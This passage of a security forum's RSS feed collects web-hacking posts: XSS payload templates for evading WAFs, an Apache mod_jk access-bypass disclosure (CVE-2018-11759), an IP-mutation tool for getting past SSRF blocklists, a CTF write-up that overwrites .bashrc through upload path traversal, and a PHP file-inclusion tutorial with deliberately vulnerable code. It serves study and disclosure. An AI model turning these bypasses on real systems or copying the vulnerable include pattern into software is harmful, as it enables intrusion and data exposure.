+<p><strong>Intractable</strong></p>
+<p>Breakout of the tag is required to execute the payload if input reflected within a tag which cannot be interacted.</p>
+<pre>{quote}&gt;{any payload scheme from html context section}</pre>
+<h5>JavaScript</h5>
+<strong> String Variable</strong>
+<p>The most common is reflection within a string variable. This is common because developers usually assign user input to a variable instead of using them directly</p>
+<pre>var name = '$input';</pre>
+<ul>
+ 	<li>
+<pre>{quote}{delimiter}{javascript}{delimiter}{quote}</pre>
+Where delimiter are usually JavaScript operators like ^.
+<p>If user input in a single quoted string variable:</p>
+</li>
+
+</ul>
+<pre>'%{javascript}%'
+'|{javascript}|'
+'&lt;{javascript}&lt;'
+'&gt;{javascript}&gt;'
+'^{javascript}^'
+'*{javascript}*'
+'+{javascript}+'
+'/{javascript}/'</pre>
+<ul>
+ 	<li>
+<pre>{quote}{delimiter}{javascript}//</pre>
+Use a single line comment to comment the rest of the code in line to valid syntax.</li>
+</ul>
+<pre>'&lt;{javascript}//'
+'|{javascript}//'
+'^{javascript}//</pre>
+<strong>BLOCKS</strong>
+<p>Example</p>
+<pre> if (a &gt; b){
+ xnxx_func('<strong>');}}alert();if(true){('</strong>');
+ }</pre>
+<p>First <strong>}</strong> close block</p>
+<p>Second <strong>}</strong> dummy func  as test</p>
+<p><strong>alert();</strong> dummy function as test</p>
+<p><strong>if(true){</strong> starts an if condition block to syntax valid.</p>
+<p><strong>(’</strong> combines with remains of function.</p>
+<p>The payload structure depends on the code itself and this uncertainty makes it difficult to detect (can add obfuscated).</p>
+<pre>');%0a}%0d}%09alert();/*xnxx.com*/if(true){//xnxx.com%0a('</pre>
+<pre> &lt;/scRipT{?filler}&gt;{html xnxx.com}</pre>
+<p>can be used to break out and execute payload but easily detected.</p>
+<h5>Finally, testing in process hunter bug.</h5>
+<pre>Name: <a href="https://modsecurity.org/" rel="noopener nofollow ugc">ModSecurity</a>
+Name: <a href="https://www.wordfence.com/" rel="noopener nofollow ugc">Wordfence</a>
+Name: <a href="https://www.cloudflare.com/" rel="noopener nofollow ugc">Cloudflare</a>
+Name: <a href="https://www.akamai.com/" rel="noopener nofollow ugc">Akamai</a>
+Name: Comodo
+Name: F5
+<p>There are many other firewall providers that I cannot provide publicly.<br>
+Sorry I cannot provide payload POC.<br>
+Original post: <a href="https://medium.com/@th3law/fun-bypass-xss-detection-waf-cabd431e030e" rel="noopener nofollow ugc">https://medium.com/@th3law/fun-bypass-xss-detection-waf-cabd431e030e</a></p>
+</pre>
+https://medium.com/secjuice/waf-evasion-techniques-718026d693d8
+<aside class="onebox allowlistedgeneric">
+  <header class="source">
+      <img src="https://0x00sec.s3.amazonaws.com/original/2X/8/8c7390150cd0078e967a18c7663581b9b334d239.png" class="site-icon" width="" height="">
+      <a href="https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0" target="_blank" rel="noopener nofollow ugc" title="04:44PM - 25 February 2018">Medium – 25 Feb 18</a>
+  </header>
+  <article class="onebox-body">
+    <img src="https://0x00sec.s3.amazonaws.com/original/2X/8/8f66716f300b4dc3f3ba7022c82bcec1e6678099.jpeg" class="thumbnail" width="" height="">
+
+<h3><a href="https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0" target="_blank" rel="noopener nofollow ugc">Web Application Firewall (WAF) Evasion Techniques #2</a></h3>
+
+<p>String concatenation in a Remote Command Execution payload makes you able to bypass firewall rules (Sucuri, ModSecurity)</p>
+
+  <p><span class="label1">Reading time: 9 min read</span>
+    </p>
+
+  </article>
+  <div class="onebox-metadata">
+    
+    
+  </div>
+  <div style="clear: both"></div>
+</aside>
+
+<aside class="onebox wikipedia">
+  <header class="source">
+      <a href="https://en.wikipedia.org/wiki/Numeric_character_reference" target="_blank" rel="noopener nofollow ugc">en.wikipedia.org</a>
+  </header>
+  <article class="onebox-body">
+    
+
+<h3><a href="https://en.wikipedia.org/wiki/Numeric_character_reference" target="_blank" rel="noopener nofollow ugc">Numeric character reference</a></h3>
+
+<p>A numeric character reference (NCR) is a common markup construct used in SGML and SGML-derived markup languages such as HTML and XML. It consists of a short sequence of characters that, in turn,  represents a single character. Since WebSgml, XML and HTML 4, the code points of the Universal Character Set (UCS) of Unicode are used. NCRs are typically used in order to represent characters that are not directly encodable in a particular document (for example, because they are international characters...</p>
+
+  </article>
+  <div class="onebox-metadata">
+    
+    
+  </div>
+  <div style="clear: both"></div>
+</aside>
+
+            <p><small>6 posts - 4 participants</small></p>
+            <p><a href="https://d.clarkee.co.uk/t/fun-bypass-xss-detection-waf/12228">Read full topic</a></p>
+          ]]></description>
+          <link>https://d.clarkee.co.uk/t/fun-bypass-xss-detection-waf/12228</link>
+          <pubDate>Tue, 12 Mar 2019 16:10:07 +0000</pubDate>
+          <discourse:topicPinned>No</discourse:topicPinned>
+          <discourse:topicClosed>Yes</discourse:topicClosed>
+          <discourse:topicArchived>No</discourse:topicArchived>
+          <guid isPermaLink="false">d.clarkee.co.uk-topic-12228</guid>
+          <source url="https://d.clarkee.co.uk/t/fun-bypass-xss-detection-waf/12228.rss">[FUN] Bypass XSS Detection WAF</source>
+        </item>
+        <item>
+          <title>[ASK] Execution After Redirect ( EAR )</title>
+          <dc:creator><![CDATA[sp3tre]]></dc:creator>
+          <category>Web Hacking</category>
+          <description><![CDATA[
+            <p>Hello everyone. I was doing challenges on the website that had a clue in challenges:</p>
+<p>There is a “execution after redirect” to one of the login pages</p>
+<p>I’ve done a test with burp, and get /user who’s re-directed to the /user/login with the response 302 found, and /cmsadmin to / with the response 301 moved permanently, But when I went change request location to /admin/1 response was “access denied”.<br>
+And I’ve been crawling all over the website with a dirbuster.<br>
+<img src="https://0x00sec.s3.amazonaws.com/original/2X/3/3725952d4850d14d1a7128e41965dc30033ef2e4.png" alt="Screenshot_2019-01-19_13-38-20" data-base62-sha1="7RQMs1UNaKqeZUvD4mzC7qyml6I" width="483" height="323"><br>
+How do I manipulate this EAR? And how do I know the possible files/dir for bypass?</p>
+<p>Please, i need ur help. Thanks a lot <img src="https://0x00sec.org/images/emoji/twitter/slight_smile.png?v=9" title=":slight_smile:" class="emoji" alt=":slight_smile:"></p>
+            <p><small>6 posts - 4 participants</small></p>
+            <p><a href="https://d.clarkee.co.uk/t/ask-execution-after-redirect-ear/10981">Read full topic</a></p>
+          ]]></description>
+          <link>https://d.clarkee.co.uk/t/ask-execution-after-redirect-ear/10981</link>
+          <pubDate>Sat, 19 Jan 2019 07:08:00 +0000</pubDate>
+          <discourse:topicPinned>No</discourse:topicPinned>
+          <discourse:topicClosed>Yes</discourse:topicClosed>
+          <discourse:topicArchived>No</discourse:topicArchived>
+          <guid isPermaLink="false">d.clarkee.co.uk-topic-10981</guid>
+          <source url="https://d.clarkee.co.uk/t/ask-execution-after-redirect-ear/10981.rss">[ASK] Execution After Redirect ( EAR )</source>
+        </item>
+        <item>
+          <title>[CVE-2018-11759] Apache mod_jk access control bypass</title>
+          <dc:creator><![CDATA[Nitrax]]></dc:creator>
+          <category>Web Hacking</category>
+          <description><![CDATA[
+            <p><strong>DISCLAIMER:</strong> Article originally published on <a href="https://www.immunit.ch/blog/2018/11/01/cve-2018-11759-apache-mod_jk-access-bypass/" rel="noopener nofollow ugc">immunIT </a></p>
+<hr>
+<p>Hi fellas,</p>
+<p>I’m exiting to introduce you to a new vulnerability found by my colleague (Xel) and me during one of our pentesting engagements <img src="https://0x00sec.org/images/emoji/twitter/slight_smile.png?v=9" title=":slight_smile:" class="emoji" alt=":slight_smile:"></p>
+<p>I almost had my first CVE on <a href="https://0x00sec.org/t/wordpress-has-never-been-safer/1875">Wordpress</a> a year ago but now here we are!</p>
+<h1>Vulnerability summary</h1>
+<ol>
+<li>
+<p>Due to discrepancies between the specifications of httpd and Tomcat for path handling, Apache mod_jk Connector 1.2.0 to 1.2.44 access controls to endpoints defined by a JkMount httpd directive can be bypassed.</p>
+</li>
+<li>
+<p>Notably, if a read-only JK status manager interface is available, it is possible to disclose the internal routes of AJP services served by mod_jk.</p>
+</li>
+<li>
+<p>Furthermore, if a read-write JK status manager interface is available, it is possible to hijack or shutdown all traffic traversing mod_jk by altering the configuration of AJP workers, or to conduct internal port scanning.</p>
+</li>
+</ol>
+<h1>Technical details</h1>
+<h2>Patch-diffing CVE-2018-1323</h2>
+<p>During a penetration test for one of our customers involving a load balancer/reverse-proxy based on Apache mod_jk serving JBoss/Tomcat webservers, we found out about vulnerability CVE-2018-1323 (reported by Alphan YAVAS from Biznet Bilisim A.S.) affecting mod_jk up to version 1.2.42.</p>
+<p>After analyzing the mod_jk 1.2.43 patch to understand this vulnerability, we realized it was a path traversal based on discrepancies between how Apache httpd and Tomcat or other Java servers handled the semicolon character for path resolution.</p>
+<p>Apache httpd interprets semicolons in URL as ordinary characters for path resolution, while Tomcat interprets them as query delimiters (with a similar functionality as “?”). Thus, an attacker could fetch a path such as <code>http://server/java_app/..;</code> did not trigger a path traversal for the logic of httpd, it was forwarded as is to the Tomcat webserver, which interpreted the string as <code>..</code> .</p>
+<p>This allowed to fetch resources that were not supposed to be accessible on the Tomcat webserver.</p>
+<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/b/bb56bfc37ab11b7a9b5d39df5fd39fd0276837cc.jpeg" alt="patch_diffing" data-base62-sha1="qJh93h2Yulkzx0PUUzRCcCZX0HG" width="445" height="500"></p>
+<p>We have identified that the vulnerability was not fully understood, as the mod_jk patch did fix this specific path traversal attack against mod_jk, but not the core issue revolving around the handling of semicolons by mod_jk.</p>
+<h2>Playing with the JK Status Manager</h2>
+<p>The JK status manager is an administration interface for mod_jk. When set in read-write, it allows the configuration of AJP workers to connect to Java Web servers to proxy HTTP requests to them.<br>
+It is normally possible to restrict access to the JK status manager, for example by using httpd directives such as:</p>
+<pre><code class="lang-bash">&lt;Location /jkstatus&gt;
+
+JKMount jk-status
+Require ip 127.0.0.1
+
+&lt;/Location&gt;
+</code></pre>
+<p>This directive is supposed to prevent any external access to the JK status manager.</p>
+<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/2/2bba8f2d8807e3818929cfc2ceef18cc6b8309a4.jpeg" alt="JKSTATUS" data-base62-sha1="6eQeqlKRLdab2E4WPnh9ECvChww" width="690" height="203"></p>
+<p>We found out that by injecting a semicolon behind the /jkstatus URL, it was possible to bypass such a restriction.</p>
+<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/6/625d73a93aa5e8420669deae51464a9a5daedb2d.jpeg" alt="JK_BYPASS" data-base62-sha1="e2b0IPUeq529kM7oNXjdhG0jsQZ" width="676" height="499"></p>
+<p>It is possible to submit GET parameters after this URL, so that state-changing requests can be made to the JK manager.</p>
+<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/6/622f7b2815d3f40025ed715808f6f5a91a2748bc.jpeg" alt="JK_DUMP" data-base62-sha1="e0AweiIsacrr6eXxEVfKR1uII1K" width="577" height="500"></p>
+<p>The impact of acccess bypass on the JK manager could be a denial of service of all applications served by mod_jk, by changing ports used by workers if the JK status manager is set with read-write access, and possibly the hijacking of all web applications served by mod_jk if an attacker connects the corresponding AJP workers to a server in his control.</p>
+<p>It would also be theoretically possible to conduct internal TCP port scanning, by changing the destination and port of an AJP worker to an internal host and port, because of the discrepancy of error messages returned by the manager depending on whether the submitted AJP port is valid or not (Bad Gateway versus Service Unavailable). The full impact of this type of SSRF is unknown.</p>
+<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/3/3d634bbe49bf5d0591aac2aec2deb4ba30c5f807.jpeg" alt="LAST" data-base62-sha1="8L3RHnhJNtkXzYn0w5Uq5kBGdW7" width="603" height="500"></p>
+<p>The JK manager (in read-only) also discloses the hostnames, IPs and ports of internal servers, routes that are served by mod_jk, and the absolute path of the httpd server on the filesystem.</p>
+<p>This example of access bypass has a high impact. However, it has to be noted that access control to any endpoint defined through a JkMount directive could possibly be bypassed by a semicolon injection.</p>
+<h1>Mitigation</h1>
+<p>A patch is available for mod_jk (<a href="https://tomcat.apache.org/download-connectors.cgi" rel="noopener nofollow ugc">version 1.2.46</a>).<br>
+Other mitigations include the use of Location values such as <code>/jkstatus*</code> , which seems to fix the issue.</p>
+<h1>Bug reference</h1>
+<p><a href="https://mail-archives.us.apache.org/mod_mbox/www-announce/201810.mbox/%3c16a616e5-5245-f26a-a5a4-2752b2826703@apache.org%3e" rel="noopener nofollow ugc">CVE-2018-11759</a></p>
+<h1>Github POC</h1>
+<p>A Docker environment is available to test this vulnerability on our <a href="https://github.com/immunIT/CVE-2018-11759" rel="noopener nofollow ugc">GitHub</a></p>
+<h1>Timeline</h1>
+<ul>
+<li>06/09/2018 : First contact with Apache Tomcat security team</li>
+<li>06/09/2018 : First response from Apache Tomcat security team</li>
+<li>13/10/2018 : <a href="https://tomcat.apache.org/download-connectors.cgi" rel="noopener nofollow ugc">mod_jk v1.2.46 fix is released</a>
+</li>
+<li>31/10/2018 : CVE-2018-11759 advisory is issued</li>
+<li>01/11/2018 : Full disclosure</li>
+</ul>
+<p>I hope you enjoyed your reading and find this finding interesting.</p>
+<p>Best,<br>
+Nitrax</p>
+            <p><small>7 posts - 3 participants</small></p>
+            <p><a href="https://d.clarkee.co.uk/t/cve-2018-11759-apache-mod-jk-access-control-bypass/9273">Read full topic</a></p>
+          ]]></description>
+          <link>https://d.clarkee.co.uk/t/cve-2018-11759-apache-mod-jk-access-control-bypass/9273</link>
+          <pubDate>Fri, 02 Nov 2018 08:37:28 +0000</pubDate>
+          <discourse:topicPinned>No</discourse:topicPinned>
+          <discourse:topicClosed>Yes</discourse:topicClosed>
+          <discourse:topicArchived>No</discourse:topicArchived>
+          <guid isPermaLink="false">d.clarkee.co.uk-topic-9273</guid>
+          <source url="https://d.clarkee.co.uk/t/cve-2018-11759-apache-mod-jk-access-control-bypass/9273.rss">[CVE-2018-11759] Apache mod_jk access control bypass</source>
+        </item>
+        <item>
+          <title>XIP - IP addresses mutation</title>
+          <dc:creator><![CDATA[Nitrax]]></dc:creator>
+          <category>Web Hacking</category>
+          <description><![CDATA[
+            <hr>
+<p><strong>DISCLAIMER:</strong> Article originally published on <a href="https://www.immunit.ch/blog/2018/09/02/xip-ip-addresses-mutation/" rel="noopener nofollow ugc">immunIT</a>.</p>
+<hr>
+<p>Hi fellas,</p>
+<p>Today, I will introduce you to a new tool, developed for the sake of one of my pentesting engagement, named XIP.</p>
+<p><a href="https://github.com/immunIT/XIP" rel="noopener nofollow ugc">XIP</a> claims to provide an efficient way to generate a list of IP addresses, using a set of mutations, in order to bypass blacklists and security measures implemented to avoid hacker to pivot within a given a network.<br>
+As you probably already know, blacklist filtering is far from being reliable and there is always a way to circumvent it, which could lead to a full compromise of the information system targeted.</p>
+<p>Let’s dive into the main subject by assuming the following scenario.</p>
+<h2>Scenario</h2>
+<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/f/f155bc6a57efd95ca0aeb18a3f9fce8de08ee480.jpeg" alt="XIP" data-base62-sha1="yqWL3ez8JxTGjgI4hpBbGLILweQ" width="618" height="236"></p>
+<p>As it can be seen on the picture above, the web application, accessible over the internet, requests the wanted server in order to provide data to the end user. A filtering process has been deployed on the web application, authorizing connections from the web application to a limited number of servers, in this case the backend server.</p>
+<p>Consequently, any connection attempt towards the other appliances will, undoubtfully, fail.<br>
+However, IP addresses can be interpreted by systems through different formats, allowing us to shunt the verification process and bypass the filtering system.</p>
+<p>It is important to note that IP addresses are handled differently according to the operating system running on the underlying server. Consequently, it does not exist a universal escaping technique.<br>
+Nevertheless, having a large file of IP addresses mutated increase the success ratio <img src="https://0x00sec.org/images/emoji/twitter/wink.png?v=9" title=":wink:" class="emoji" alt=":wink:">.</p>
+<p>This is why XIP is born.</p>
+<h2>XIP</h2>
+<p>XIP provides several mutations and representations format. Below are the implemented transformations:</p>
+<ul>
+<li>Hexadecimal</li>
+<li>Decimal</li>
+<li>Octal</li>
+<li>IPV4 to IPV6 conversion</li>
+<li>Dotless</li>
+<li>Zeroless</li>
+<li>Padding</li>
+<li>Overflow</li>
+</ul>
+<p>Moreover, these mutations can be performed randomly, allowing you to push the filtering system to its limits.</p>
+<h3>Usage</h3>
+<p>XIP works out of the box thanks to its dockerization</p>
+<pre><code class="lang-bash">docker pull immunit/xip
+docker run --rm -it immunit/xip --help
+</code></pre>
+<p>If docker seems unfriendly to you, XIP can be directly used on any system using python3.</p>
+<pre><code class="lang-bash">python3 xip.py --help
+</code></pre>
+<h3>Example</h3>
+<p><a href="https://asciinema.org/a/bQ51BOhJcFMM9glz9Sky7FExm" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/original/2X/3/39905612c92369af05bd388f0802b7c3d51ff084.png" alt="asciicast" width="" height=""></a></p>
+<h2>Conclusion</h2>
+<p>Bypassing such filtering system often lead to critical discovery e.g. SSRF, RCE, etc. I believe that this tool could be, combined with the BurpSuite intruder, valuable to any security assessment.</p>
+<p>As any open source project, pull requests are widely welcome!</p>
+<p>Github repository =&gt; <a href="https://github.com/immunIT/XIP" rel="noopener nofollow ugc">https://github.com/immunIT/XIP</a></p>
+<p>Happy hacking,</p>
+<p>Best,<br>
+Nitrax</p>
+            <p><small>5 posts - 2 participants</small></p>
+            <p><a href="https://d.clarkee.co.uk/t/xip-ip-addresses-mutation/8428">Read full topic</a></p>
+          ]]></description>
+          <link>https://d.clarkee.co.uk/t/xip-ip-addresses-mutation/8428</link>
+          <pubDate>Wed, 05 Sep 2018 07:29:59 +0000</pubDate>
+          <discourse:topicPinned>No</discourse:topicPinned>
+          <discourse:topicClosed>Yes</discourse:topicClosed>
+          <discourse:topicArchived>No</discourse:topicArchived>
+          <guid isPermaLink="false">d.clarkee.co.uk-topic-8428</guid>
+          <source url="https://d.clarkee.co.uk/t/xip-ip-addresses-mutation/8428.rss">XIP - IP addresses mutation</source>
+        </item>
+        <item>
+          <title>Whitehatvn Grandprix CTF - Web01 writeup</title>
+          <dc:creator><![CDATA[Pyhscript]]></dc:creator>
+          <category>Web Hacking</category>
+          <description><![CDATA[
+            <p>This weekend we participated in Whitehatvn Grandprix CTF and this is one of the 2 real challenges we managed to solve.<br>
+Big thanks to <a class="mention" href="https://d.clarkee.co.uk/u/anon3236228">@anon3236228</a> for executing exploit while challenge was officially down,<br>
+getting us flag quicker (and for being help in brainstorming).</p>
+<p>Description:<br>
+manhndd is running a service file upload at<br>
+<a href="http://web01.grandprix.whitehatvn.com" rel="noopener nofollow ugc">web01.grandprix.whitehatvn.com</a>,<br>
+it is restored every 2 minutes. Every 1 minute after service starts, he ssh into server to check /var/secret. Can you get it?</p>
+<p>Writeup:</p>
+<p>After visiting provided website we are presented with upload page running SimpleHttpServerWithUpload.py, it didn’t ask for any particular file type and didn’t check extension.<br>
+I saw other players trying to upload various shells without success so I decided to inspect upload functionality closer.</p>
+<p>I used <a href="https://portswigger.net/burp/help/repeater_using" rel="noopener nofollow ugc">Burp Repeater</a> which is nice tool for easily and quickly changing your requests and getting results back.<br>
+After uploading test file we are presented with following message:</p>
+<p><img src="//0x00sec.s3.amazonaws.com/original/2X/8/83781966e7fe22911c6a8b50e81cd12440226bf3.png" alt="burp-web01-2" data-base62-sha1="iL1RjYnLjz78tVj09bnErw8MhF1" width="690" height="387"></p>
+<p>So we know our files are saved in /opt directory, I tried to go one directory up by modifying filename parameter to “/…/test”<br>
+which resulted in “Couldn’t save file , are you sure you have right permissions?” which means that upload is vulnerable to <a href="https://www.owasp.org/index.php/Path_Traversal" rel="noopener nofollow ugc">directory traversal</a>! But we can’t write anywhere, first thing I tried was writing to /tmp:</p>
+<p><img src="//0x00sec.s3.amazonaws.com/original/2X/e/e29c570dbddbc6112b423ead187d048b1cb5ddae.png" alt="burp-web01-3" data-base62-sha1="wkGREn1FVrrE8AU7rZsW4QFfoIe" width="690" height="387"></p>
+<p>Great, but not very useful , we can’t even read file we uploaded <img src="https://0x00sec.org/images/emoji/twitter/frowning.png?v=9" title=":frowning:" class="emoji" alt=":frowning:"> . I unsuccesfully tried to write a cron file, and even had crazy<br>
+ideas about exploiting service by writing to something in /proc/self/ but it resulted in nothing. Then I reread description again:</p>
+<p><code>**manhndd** is running a service file upload at...Every 1 minute after service starts, **he ssh into server**...</code></p>
+<p>Of course! It should be possible to write to home directory of this user and overwrite his <a href="https://unix.stackexchange.com/questions/129143/what-is-the-purpose-of-bashrc-and-how-does-it-work" rel="noopener nofollow ugc">.bashrc</a> file which is executed every time he logs in.<br>
+Test file first:</p>
+<p><img src="//0x00sec.s3.amazonaws.com/original/2X/4/4134efdbe349d722e541bbe097f0dfca79e62413.png" alt="burp-web01-4" data-base62-sha1="9iQs3i6ezGLCxlNTEAK6LPlruMz" width="690" height="387"></p>
+<p>Awesome, write was successful but how to get a flag out? After few attempts of using netcat we realized outbound connections were blocked<br>
+so we decided to write to /opt which we seemed to have access to:</p>
+<p><img src="//0x00sec.s3.amazonaws.com/original/2X/b/b8d125213db004d345d8b1d3c2f18ba6e82e4db3.png" alt="finalscreenshot-web01" data-base62-sha1="qmXWDqyibUy30w3YMDbHMJUQawb" width="690" height="387"></p>
+<p>And it worked! Flag could be found at <a href="http://web01.grandprix.whitehatvn.com/shellPyhscript" rel="noopener nofollow ugc">web01.grandprix.whitehatvn.com/shellPyhscript</a> <img src="https://0x00sec.org/images/emoji/twitter/smiley.png?v=9" title=":smiley:" class="emoji" alt=":smiley:"></p>
+            <p><small>3 posts - 2 participants</small></p>
+            <p><a href="https://d.clarkee.co.uk/t/whitehatvn-grandprix-ctf-web01-writeup/8138">Read full topic</a></p>
+          ]]></description>
+          <link>https://d.clarkee.co.uk/t/whitehatvn-grandprix-ctf-web01-writeup/8138</link>
+          <pubDate>Sun, 19 Aug 2018 23:00:22 +0000</pubDate>
+          <discourse:topicPinned>No</discourse:topicPinned>
+          <discourse:topicClosed>Yes</discourse:topicClosed>
+          <discourse:topicArchived>No</discourse:topicArchived>
+          <guid isPermaLink="false">d.clarkee.co.uk-topic-8138</guid>
+          <source url="https://d.clarkee.co.uk/t/whitehatvn-grandprix-ctf-web01-writeup/8138.rss">Whitehatvn Grandprix CTF - Web01 writeup</source>
+        </item>
+        <item>
+          <title>[Node.js Deserialization] How to hack a node.js server [Hackthebox]</title>
+          <dc:creator><![CDATA[narcan]]></dc:creator>
+          <category>Web Hacking</category>
+          <description><![CDATA[
+            <p>Hello everyone! As i promised ill slowly be bringing you unique and hopefully 0day hacking content.</p>
+<p>This is a video guide showcasing a hackthebox machine and since the rules state no solutions can be given this is just a teaser to get you started.</p>
+<p>If you have any requests for assistance or certain methods youd like showcased just shoot me a pm or leave a comment.</p>
+<p>            <iframe src="https://www.youtube.com/embed/jIQWAz8UsLc?feature=oembed&amp;wmode=opaque" width="480" height="360" frameborder="0" allowfullscreen="" class="youtube-onebox" seamless="seamless" sandbox="allow-same-origin allow-scripts allow-forms allow-popups allow-popups-to-escape-sandbox allow-presentation"></iframe>
+</p>
+            <p><small>10 posts - 4 participants</small></p>
+            <p><a href="https://d.clarkee.co.uk/t/node-js-deserialization-how-to-hack-a-node-js-server-hackthebox/7868">Read full topic</a></p>
+          ]]></description>
+          <link>https://d.clarkee.co.uk/t/node-js-deserialization-how-to-hack-a-node-js-server-hackthebox/7868</link>
+          <pubDate>Thu, 02 Aug 2018 00:21:35 +0000</pubDate>
+          <discourse:topicPinned>No</discourse:topicPinned>
+          <discourse:topicClosed>Yes</discourse:topicClosed>
+          <discourse:topicArchived>No</discourse:topicArchived>
+          <guid isPermaLink="false">d.clarkee.co.uk-topic-7868</guid>
+          <source url="https://d.clarkee.co.uk/t/node-js-deserialization-how-to-hack-a-node-js-server-hackthebox/7868.rss">[Node.js Deserialization] How to hack a node.js server [Hackthebox]</source>
+        </item>
+        <item>
+          <title>[PHP] File inclusion vulnerability</title>
+          <dc:creator><![CDATA[Poacher]]></dc:creator>
+          <category>Web Hacking</category>
+          <description><![CDATA[
+            <h2><a name="p-20791-preface-1" class="anchor" href="https://d.clarkee.co.uk#p-20791-preface-1"></a>Preface</h2>
+<hr>
+<blockquote>
+<p>A file inclusion vulnerability is a type of vulnerability that is most commonly found to affect web applications that rely on a scripting run time. This issue is caused when an application builds a path to executable code using an attacker-controlled variable in a way that allows the attacker to control which file is executed at run time. If a file contains this loophole ot often was implemented in the development stage for convenience.  Because it is often used in development and later forgotten, it has become the target of multiple attacks and has resulted in a variety of file-based attacks.</p>
+</blockquote>
+<h2><a name="p-20791-local-file-inclusion-2" class="anchor" href="https://d.clarkee.co.uk#p-20791-local-file-inclusion-2"></a>Local file inclusion</h2>
+<hr>
+<p>First of all, when the value can directly  be be controlled we have a very similar code snippet as below present:</p>
+<pre data-code-wrap="php"><code class="lang-php">&lt;? php
+$ file = $ _GET ['file'];
+include ($ file);
+</code></pre>
+<p>If we can find the above code,  there is a directly included <code>$file</code>, which we have control over.</p>
+<blockquote>
+<p>Note: The file can be anything. It is included no matter if it’s an exptected file type, a picture, or anything arbitrary.</p>
+</blockquote>
+<p>First of all in the current folder create an arbitrary file with any suffix, such as: <code>file.txt</code> (even if it is a picture format like file.jpg then the following effect takes place).<br>
+Set the contents of the file as:</p>
+<pre data-code-wrap="php"><code class="lang-php">&lt;? php
+phpinfo ();
+</code></pre>
+<p></p><div class="lightbox-wrapper"><a class="lightbox" href="//0x00sec.s3.amazonaws.com/original/2X/a/afb212c0efd2ff0920bfcaaaea652d679969d5ff.png" data-download-href="/uploads/short-url/p4h4NZr0tMa083oLi2h0kUA1BG7.png?dl=1" title="957843622.png" rel="noopener nofollow ugc"><img src="//0x00sec.s3.amazonaws.com/original/2X/a/afb212c0efd2ff0920bfcaaaea652d679969d5ff.png" width="690" height="290"></a></div><p></p>
+<p>File Inclusion Vulnerabilities also contain other files within the current server while supporting directories that contain <code>web</code> applications, as follows:<br>
+Try to include some of the contents of your HDD for example: <code>C:\WINDOWS\system.ini</code></p>
+<p></p><div class="lightbox-wrapper"><a class="lightbox" href="//0x00sec.s3.amazonaws.com/original/2X/a/a5f5bfdfad506783fd997f93deab0ac3c61ce8ab.png" data-download-href="/uploads/short-url/nG9ivuh2gIo60vN3bXqeJQNLapt.png?dl=1" title="441958098.png" rel="noopener nofollow ugc"><img src="//0x00sec.s3.amazonaws.com/original/2X/a/a5f5bfdfad506783fd997f93deab0ac3c61ce8ab.png" width="690" height="304"></a></div><p></p>
+<p>If we do this, we can see that the contents of any file will be outputted to the browser.</p>
+<p>This only works if we have total control and the file type is not further specified.<br>
+So what can we do if the code snippet changes to this:</p>
+<pre data-code-wrap="php"><code class="lang-php">&lt;?php
+	$file = $_GET['file'] . '.php';
+	echo $file;
+	include($file);
+</code></pre>
+<p>In this case, we can try to follow the  method above:<br>
+This will result in an output like this:</p>
+<p></p><div class="lightbox-wrapper"><a class="lightbox" href="//0x00sec.s3.amazonaws.com/original/2X/3/316cff7f88ff35aac3c571813b3ad851017be68a.png" data-download-href="/uploads/short-url/73eVf4kSekrABGiRRdnhbwb4e26.png?dl=1" title="3465450773.png" rel="noopener nofollow ugc"><img src="//0x00sec.s3.amazonaws.com/original/2X/3/316cff7f88ff35aac3c571813b3ad851017be68a.png" width="690" height="132"></a></div><p></p>
+<p>We can see that if the  suffix is fixed, then just like in the figure above, we will not find the file we included earlier.<br>
+The searched for filename is: <code>./Include.txt.php</code>.</p>
+<hr>
+<p>So here’s another way to do that: <code>%00</code> truncates a string upon reaching.<br>
+This trick is widly spread and used in different areas as well.<br>
+I won’t go into any more detail here .<br>
+I recommend checking out online ressources like <a href="http://php.net/manual/en/security.filesystem.nullbytes.php" rel="noopener nofollow ugc">this</a>!</p>
+<p>Using <code>%00</code> in PHP:</p>
+<ol>
+<li>PHP version &lt;5.3 (excluding 5.3);<br>
+PHP <code>magic_quotes_gpc = off</code>;<br>
+PHP does not use the addslashes function for the received parameters, such as `$ _GET [‘file’] in the above code</li>
+</ol>
+<p>In PHP version 5.3 or later this issue has been fixed.<br>
+The sequence will be correctly  escaped if <code>gpc</code> is turned on or the<code> addslashes</code> function is used.<br>
+First of all, we can try what happens if the <code>gpc</code> is turned on (the effect is the same as using the function)</p>
+<p></p><div class="lightbox-wrapper"><a class="lightbox" href="//0x00sec.s3.amazonaws.com/original/2X/f/fab6f8647f0f7ffdc0f11509d3031e49cbbb47a8.png" data-download-href="/uploads/short-url/zLVnxk2fyFrEW8V8G2m0yZQMwqY.png?dl=1" title="2941944704.png" rel="noopener nofollow ugc"><img src="//0x00sec.s3.amazonaws.com/original/2X/f/fab6f8647f0f7ffdc0f11509d3031e49cbbb47a8.png" width="690" height="429"></a></div><p></p>
+<p></p><div class="lightbox-wrapper"><a class="lightbox" href="//0x00sec.s3.amazonaws.com/original/2X/d/da998a1b5f4bb9cfccd014c162bce81aed836bcc.png" data-download-href="/uploads/short-url/vbP2OqC5r9Yz0THGU7wrRL9ymNS.png?dl=1" title="2773143791.png" rel="noopener nofollow ugc"><img src="//0x00sec.s3.amazonaws.com/original/2X/d/da998a1b5f4bb9cfccd014c162bce81aed836bcc.png" width="690" height="149"></a></div><p></p>
+<p>We can directly see how this case is handled if we enable the <code>gpc</code> flag.</p>
+<p>Next we take a look at the situation in 5.3:</p>
+<p></p><div class="lightbox-wrapper"><a class="lightbox" href="//0x00sec.s3.amazonaws.com/original/2X/f/f3093f925f9a1a34aa9da0ddd12bd5c02ea06033.png" data-download-href="/uploads/short-url/yFZQ44qoz9ctF6cDbrNFp2yEBdp.png?dl=1" title="618663116.png" rel="noopener nofollow ugc"><img src="//0x00sec.s3.amazonaws.com/original/2X/f/f3093f925f9a1a34aa9da0ddd12bd5c02ea06033.png" width="690" height="406"></a></div><br>
